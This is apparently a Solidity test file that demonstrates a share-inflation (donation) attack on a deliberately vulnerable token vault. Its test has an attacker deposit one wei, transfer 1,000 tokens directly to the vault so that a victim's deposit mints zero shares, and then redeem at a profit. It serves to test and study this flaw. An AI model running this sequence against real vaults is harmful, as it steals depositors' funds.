// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/VulnerableVault.sol";

contract Actor {
    MockERC20 public immutable token;
    VulnerableVault public immutable vault;

    constructor(MockERC20 token_, VulnerableVault vault_) {
        token = token_;
        vault = vault_;
    }

    function approveVault() external {
        token.approve(address(vault), type(uint256).max);
    }

    function deposit(uint256 assets) external {
        vault.deposit(assets, address(this));
    }

    function donate(uint256 assets) external {
        token.transfer(address(vault), assets);
    }

    function redeemAll() external {
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
    }

    function tokenBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}

contract VulnerableVaultTest {
    function testDonationInflationProfitable() public {
        MockERC20 token = new MockERC20();
        VulnerableVault vault = new VulnerableVault(token);
        Actor attacker = new Actor(token, vault);
        Actor victim = new Actor(token, vault);

        token.mint(address(attacker), 2_000 ether);
        token.mint(address(victim), 1_000 ether);
        attacker.approveVault();
        victim.approveVault();

        attacker.deposit(1);
        attacker.donate(1_000 ether);
        victim.deposit(1_000 ether);

        require(vault.balanceOf(address(victim)) == 0, "victim should mint zero shares");

        uint256 attackerBeforeRedeem = attacker.tokenBalance();
        attacker.redeemAll();
        uint256 attackerAfterRedeem = attacker.tokenBalance();

        require(attackerAfterRedeem > attackerBeforeRedeem, "attacker should profit");
        require(attackerAfterRedeem > 2_000 ether, "attacker ends above starting balance");
    }
}
